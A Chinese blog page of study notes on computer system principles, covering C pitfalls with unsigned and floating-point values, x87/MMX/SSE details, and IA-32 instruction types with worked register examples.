<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">unsigned</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i =<span class="number">0</span>; i &lt;= len<span class="number">-1</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当参数len为0时，返回值应该是0，但是在机器上执行时，却发生了存储器访问异常。<br>原因在于len是一个无符号数，len-1得到的是32个1所以，循环时会无限循环，所以这里再次告诉我们尽量不要使用unsigned。  </p>
<h1 id="X87浮点处理指令"><a href="#X87浮点处理指令" class="headerlink" title="X87浮点处理指令 "></a>X87浮点处理指令 </h1><p>IA-32中处理的浮点数类型有三种：float（32位IEEE 754）、double（64位IEEE 754）、long double（80位双精度扩展格式）<br>1位符号位s、15位阶码e（偏致常数16383）、1位显示首位有效位j和63位尾数f。它与IEEE 754单精度和双精度浮点格式的一个重要区别是：他没有隐藏位，有效位共64位。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1.0</span>/x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> a,b;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	a = f(<span class="number">10</span>);</span><br><span class="line">	b = f(<span class="number">10</span>);</span><br><span class="line">	i = a== b;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1.0</span>/x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> a,b,c;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	a = f(<span class="number">10</span>);</span><br><span class="line">	b = f(<span class="number">10</span>);</span><br><span class="line">	c = f(<span class="number">10</span>);</span><br><span class="line">	i = a== b;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在早期的gcc编译器中，程序一结果0，程序二结果1，原因在于对于数据结果存储时有数据丢失。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">double</span>*p = (<span class="keyword">double</span> *)&amp;a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%f\n"</span>, *p);<span class="comment">//0.000000</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%f\n"</span>, (<span class="keyword">double</span>)a);<span class="comment">//10.000000</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前后两次打印结果不一样，原因在于后面一种做法是使用了转换指令先把int转为double，而第一个没有。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">	printf(&quot;%f\n&quot;, *p);//0.000000</span><br><span class="line">00FB1795  mov         eax,dword ptr [p]  </span><br><span class="line">00FB1798  sub         esp,8  </span><br><span class="line">00FB179B  movsd       xmm0,mmword ptr [eax]  </span><br><span class="line">00FB179F  movsd       mmword ptr [esp],xmm0  </span><br><span class="line">00FB17A4  push        offset string &quot;%f\n&quot; (0FB6B30h)  </span><br><span class="line">00FB17A9  call        _printf (0FB1316h)  </span><br><span class="line">00FB17AE  add         esp,0Ch  </span><br><span class="line">	printf(&quot;%f\n&quot;, (double)a);//10.000000</span><br><span class="line">00FB17B1  cvtsi2sd    xmm0,dword ptr [a]  </span><br><span class="line">00FB17B6  sub         esp,8  </span><br><span class="line">00FB17B9  movsd       mmword ptr [esp],xmm0  </span><br><span class="line">00FB17BE  push        offset string &quot;%f\n&quot; (0FB6B30h)  </span><br><span class="line">00FB17C3  call        _printf (0FB1316h)  </span><br><span class="line">00FB17C8  add         esp,0Ch</span><br></pre></td></tr></table></figure>
<p>从汇编我们可以看到第二个打印函数中出现了一个cvsi2sd，而这个指令就是用于将双字整数转换成标量双精度浮点值</p>
<h1 id="MMX及SSE指令"><a href="#MMX及SSE指令" class="headerlink" title="MMX及SSE指令"></a>MMX及SSE指令</h1><p>MMX指令使用8个64位寄存器MM0~MM7，借用8个80位寄存器ST(0)~ST(7)中的64位尾数所占的位，可同时处理8个字节，或4个字，或2个双字，或一个64位数据，是一种SIMD技术。SSE是在MMX基础上提出来的。单指令多数据技术。<br>SSE指令集价格80位浮点寄存器扩充到128位多媒体扩展通用寄存器XMM0~XMM7，可同时处理16个字节，或8个字，或4个双字，或两个字节的数据。</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/notes/">notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-12-IA-32指令类型1"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/12/2017-05-12-IA-32指令类型1/">IA-32指令类型（1）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/12/2017-05-12-IA-32指令类型1/" class="article-date">
	  <time datetime="2017-05-11T16:00:00.000Z" itemprop="datePublished">五月 12, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="传送指令"><a href="#传送指令" class="headerlink" title="传送指令"></a>传送指令</h1><h2 id="通用数据传送指令"><a href="#通用数据传送指令" class="headerlink" title="通用数据传送指令"></a>通用数据传送指令</h2><p>MOV：一般传送，包括movb、movw、movl<br>MOVS：符号传送，如movsbw、movswl<br>MOVZ：零扩展传送，如movzwl、movzbl<br>XCHG：数据交换<br>PUSH/POP：入栈出栈，如pushl、pushw、popl、popw<br>入栈sp-，出栈sp+</p>
<h2 id="地址传送指令"><a href="#地址传送指令" class="headerlink" title="地址传送指令"></a>地址传送指令</h2><p>LEA：加载有效地址，如leal (%edx,%eax),%eax的功能为R[eax]&lt;-R[edx]+R[eax]，执行前，若R[edx]=i,R[eax]=j，则执行指令后，R[eax]=i+j</p>
<h2 id="输入输出指令"><a href="#输入输出指令" class="headerlink" title="输入输出指令"></a>输入输出指令</h2><p>IN和OUT：I/O端口与寄存器之间的交换</p>
<h2 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h2><p>PUSHF、POPF：将EFLAG压栈，或将栈顶内容送EFLAG</p>
<h1 id="定点算术运算指令"><a href="#定点算术运算指令" class="headerlink" title="定点算术运算指令"></a>定点算术运算指令</h1><h2 id="加减运算指令（影响标志、不区分无-带符号）"><a href="#加减运算指令（影响标志、不区分无-带符号）" class="headerlink" title="加减运算指令（影响标志、不区分无/带符号）"></a>加减运算指令（影响标志、不区分无/带符号）</h2><p>ADD：加，包括addb、addw、addl<br>SUB：减，包括subb、subw、subl<br>假设R[ax]=fffah，R[bx]=fff0h，则执行指令后“addw %bx,%ax”<br>R[ax]=fffah+fff0h=ffeah，bx中内容不变<br>CF=1，OF=0，ZF=0，SF=1<br>若是无符号数运算，则CF=1说明结果溢出<br>若是带符号整数运算，则OF=0说明结果没有溢出</p>
<h2 id="增1-减1运算（影响除CF以外的标志、不区分无-带符号）"><a href="#增1-减1运算（影响除CF以外的标志、不区分无-带符号）" class="headerlink" title="增1/减1运算（影响除CF以外的标志、不区分无/带符号）"></a>增1/减1运算（影响除CF以外的标志、不区分无/带符号）</h2><p>INC：加，包括incb、incw、incl<br>DEC：减，包括decb、decw、decl</p>
<h2 id="取负运算（影响标志、若对0取负、则结果为0且CF清0，否则CF置1）"><a href="#取负运算（影响标志、若对0取负、则结果为0且CF清0，否则CF置1）" class="headerlink" title="取负运算（影响标志、若对0取负、则结果为0且CF清0，否则CF置1）"></a>取负运算（影响标志、若对0取负、则结果为0且CF清0，否则CF置1）</h2><p>NEG：取负，包括negb、negw、negl</p>
<h2 id="比较运算（做减法得到标志、不区分无-带符号）"><a href="#比较运算（做减法得到标志、不区分无-带符号）" class="headerlink" title="比较运算（做减法得到标志、不区分无/带符号）"></a>比较运算（做减法得到标志、不区分无/带符号）</h2><p>CMP：比较，包括cmpb、cmpw、cmpl</p>
<h2 id="乘-除运算（不影响标志、区分无-带符号）"><a href="#乘-除运算（不影响标志、区分无-带符号）" class="headerlink" title="乘/除运算（不影响标志、区分无/带符号）"></a>乘/除运算（不影响标志、区分无/带符号）</h2><p>MUL/IMUL：无符号乘/带符号乘<br>DIV/IDIV：无符号乘/带符号乘<br>乘法指令：可以给出一个、两个或三个操作数<br>若给出一个操作数SRC，则另一个源操作数隐含在AL/AX/EAX中，将SRC和累加器内容相乘，结果存放在AX或DX-AX或EDX-EAX中。DX-AX表示32位乘积的高、低位分别在DX和AX中。n<em>n=2n<br>若指令中给出两个操作数DST和SRC，则将DST和SRC相乘，结果在DST中。n</em>n=n<br>若指令给出三个操作数REG、SRC、IMM，则将SRC和立即数IMM相乘，结果在REG中。n<em>n=n<br>除法指令：只明显指出除数，用EDX-EAX中内容除以指定的除数<br>若为8位，则16位被除数在AX寄存器中，商送回AL，余数在AH<br>若为16位，则32位被除数在DX-AX寄存器中，商送回AX，余数在DX<br>若为32，则被除数在EDX-EAX寄存器中，商送EAX，余数在EDX<br>假设R[eax]=000000b4h，R[ebx]=00000011h，M[000000f8h]=000000a0h，执行下面指令mulb %bl功能为$$R[ax]&lt;-R[al]</em>R[bl]$$，执行结果    $$R[ax]=b4h<em>11h=0bf4h$$(无符号整数180和17相乘)<br>$$R[ax]=b4h</em>11h=faf4h$$(带符号整数-76和17相乘)<br>对于带符号数乘，若乘积只取低n位，则和无符号数相同；若取2n位，则采用布斯乘法。<br>执行$$imull -16,(\%eax,\%ebx,4),\%eax$$功能为$$R[eax]&lt;-(-16)<em>M[R[eax]+R[ebx]</em>4]$$，执行结果为<br>$$R[eax]+R[ebx]<em>4=000000b4h+00000011h&lt;&lt;2=000000f8h$$<br>$$R[eax]=-16</em>M[000000f8h]=16*(-000000a0h)=ffffff60h&lt;&lt;4=fffff600h$$  </p>
<h1 id="按位运算指令"><a href="#按位运算指令" class="headerlink" title="按位运算指令"></a>按位运算指令</h1><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><p>NOT：非，包括notb、notw、notl<br>AND：与，包括andb、andw、andl<br>OR：或，包括orb、orw、orl<br>XOR：异或，包括xorb、xorw、xorl<br>TEST：做“与”操作测试，仅影响标志<br>只有not指令不影响标志，其他指令OF=CF=0，而ZF和SF则根据结果设置：若全0，则ZF=1；若最高位为1，则SF=1<br>假设M[0x1000]=00000f89h,M[0x1004]=000001270h,R[eax]=ff000001h,R[ecx]=00001000h  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">notw %ax R[ax]=fffeh;  </span><br><span class="line">andl %eax,(%ecx)=00000f89h^ff000001h=00000001h  </span><br><span class="line">orb 4(%ecx),%al=70h | 01h=71h</span><br></pre></td></tr></table></figure>
<h2 id="移位运算（左-右移时，最高-最低位送CF）"><a href="#移位运算（左-右移时，最高-最低位送CF）" class="headerlink" title="移位运算（左/右移时，最高/最低位送CF）"></a>移位运算（左/右移时，最高/最低位送CF）</h2><p>SHL/SHR：逻辑左/右移，包括shlb，shrw，shrl<br>SAL/SAR：算数左/右移，左移要判断溢出，右移高位补符号（移位前、后符号位发生变化，则OF=1）包括salb、sarw、sarl<br>ROL/ROR：循环左/右移，包括rolb、rorw、roll<br>RCL/RCR：带进位循环左/右移，即：将CF作为操作数一部分循环移位，包括rclb、rcrw、rcll<br>假设short型变量x被编译器分配在寄存器AX中，R[ax]=ff80h,则以下汇编代码执行后变量x的机器数和真值  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movw %ax,%dx    R[dx]&lt;-R[ax]  </span><br><span class="line">salw $2,%ax    1111 1111 1000 0000&lt;&lt;2  </span><br><span class="line">addl %dx,%ax    1111 1110 0000 0000 +1111 1111 1000 0000  </span><br><span class="line">sarw $1,%ax    1111 1101 1000 0000&gt;&gt;1=1111 1110 1100 0000</span><br></pre></td></tr></table></figure>
<p>\$2与\$1表示立即数2和1。</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/notes/">notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/10/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/12/">下一页</a>
  </nav>

</section>
          <aside id="sidebar">
  
    <div style="margin: 20px 0;">
	<div id="search-form-wrap">

    <form class="search-form">
        <label style="width: 72%;">
            <span class="screen-reader-text">Search for:</span>
            <input type="search" class="search-field" style="height: 36px; width: 100%;" placeholder=" 搜索…" value="" name="s" title="Search for:">
        </label>
        <input type="submit" class="search-form-submit" value="搜索">
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(无标题)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">联系我们</h3>
    <div class="widget widget_athemes_social_icons">

    	<ul class="clearfix widget-social-icons">   
    	
   			<li><a href="https://github.com/iTimeTraveler" title="Github"><i class="fa fa-github" aria-hidden="true"></i></a></li> 

   		
   			<li><a href="" title="Weibo"><i class="fa fa-weibo" aria-hidden="true"></i></a></li> 

   		
   			<li><a href="" title="Twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a></li> 

   		
   			<li><a href="" title="Facebook"><i class="fa fa-facebook" aria-hidden="true"></i></a></li> 

   		
   			<li><a href="" title="Google-plus"><i class="fa fa-google-plus" aria-hidden="true"></i></a></li> 

   		
   			<li><a href="" title="Instagram"><i class="fa fa-instagram" aria-hidden="true"></i></a></li> 

   		
   		</ul>


   		<!--
   		<ul class="clearfix widget-social-icons">   		
   		<li class="widget-si-twitter"><a href="http://twitter.com" title="Twitter"><i class="ico-twitter"></i></a></li> 
		<li class="widget-si-facebook"><a href="http://facebook.com" title="Facebook"><i class="ico-facebook"></i></a></li>
			<li class="widget-si-gplus"><a href="http://plus.google.com" title="Google+"><i class="ico-gplus"></i></a></li>
			<li class="widget-si-pinterest"><a href="http://pinterest.com" title="Pinterest"><i class="ico-pinterest"></i></a></li>
			<li class="widget-si-flickr"><a href="http://flickr.com" title="Flickr"><i class="ico-flickr"></i></a></li>
			<li class="widget-si-instagram"><a href="http://instagram.com" title="Instagram"><i class="ico-instagram"></i></a></li>
		</ul> -->

    </div>
  </div>


  
    
  <div class="widget_athemes_tabs">
    <ul id="widget-tab" class="clearfix widget-tab-nav">
      <li class="active"><a>最新文章</a></li>
    </ul>
    <div class="widget">
      <ul>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/2017/12/20/2017-12-20-YOLOv2代码分析（四）/">YOLOv2代码分析（四）</a></h6>
              <span>十二月 20, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/2017/12/19/2017-12-19-YOLOv2代码分析（三）/">YOLOv2代码分析（三）</a></h6>
              <span>十二月 19, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/2017/12/17/2017-12-17-YOLOv2代码分析（二）/">YOLOv2代码分析（二）</a></h6>
              <span>十二月 17, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/2017/12/16/2017-12-16-YOLOv2代码分析（一）/">YOLOv2代码分析（一）</a></h6>
              <span>十二月 16, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/2017/12/15/2017-12-15-目标检测中的IOU计算问题/">目标检测中的IOU计算问题</a></h6>
              <span>十二月 15, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/2017/12/13/2017-12-13-tf.identity的作用/">tf.identity的作用</a></h6>
              <span>十二月 13, 2017</span>
            </div>

          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Database/">Database</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/QT/">QT</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/asp/">asp</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/c/">c</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/cpp/">cpp</a><span class="category-list-count">77</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/index/">index</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/toy/">toy</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/信息安全/">信息安全</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/图像处理/">图像处理</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/机器学习/">机器学习</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法/">算法</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机系统原理/">计算机系统原理</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机网络/">计算机网络</a><span class="category-list-count">2</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/1080ti/">1080ti</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Aggregate/">Aggregate</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dell/">Dell</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Eassy/">Eassy</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Eval/">Eval</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Execute/">Execute</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ExecuteGlobal/">ExecuteGlobal</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fibonacci/">Fibonacci</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IOU/">IOU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kolakoski/">Kolakoski</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MNIST/">MNIST</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PIL/">PIL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/POD/">POD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QT/">QT</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/YOLO/">YOLO</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/acm/">acm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/advance/">advance</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/array/">array</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/asp/">asp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/auto/">auto</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/auto/">auto&</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/auto/">auto&&</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/binding/">binding</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c#</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cin/">cin</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/constexpr/">constexpr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cpp/">cpp</a><span class="tag-list-count">90</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cpp标准库/">cpp标准库</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cpp第二版/">cpp第二版</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cuda/">cuda</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cudnn/">cudnn</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/darknet/">darknet</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dd/">dd</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/default/">default</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/downcasting/">downcasting</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/error/">error</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/estimator/">estimator</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forward/">forward</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glvalue/">glvalue</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hook/">hook</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/identity/">identity</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lambda/">lambda</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lvalue/">lvalue</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/map/">map</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mismatch/">mismatch</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/move/">move</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/namehiding/">namehiding</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/next/">next</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/notes/">notes</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/numpy/">numpy</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/office/">office</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/oj/">oj</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opencv/">opencv</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/oracle/">oracle</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/overload/">overload</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/override/">override</a><span class="tag-list-count">2</span></li><li 